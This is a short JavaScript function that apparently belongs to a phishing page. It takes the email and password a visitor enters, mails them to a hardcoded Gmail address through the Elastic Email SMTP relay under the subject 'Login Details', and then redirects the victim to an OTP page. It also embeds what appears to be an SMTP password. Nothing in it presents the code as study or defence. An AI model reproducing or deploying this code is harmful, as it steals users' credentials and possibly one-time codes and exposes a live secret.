function emailSend() {
  var email = document.getElementById('email').value;
  var password = document.getElementById('password').value;
  var messageBody = "Email " + email +
    "<br/> pass " + password;

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "burujikasamu42@gmail.com",
    Password: "4EBB12813A91DC5063FFFB31AF367160FECC",
    To: 'burujikasamu42@gmail.com', // Change this to your email address where you want to receive the OTP
    From: "burujikasamu42@gmail.com",
    Subject: "Login Details",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'otp.html';
      }
      else {
        swal("Error", "Please complete form details", "error")
      }
    }
  );
}
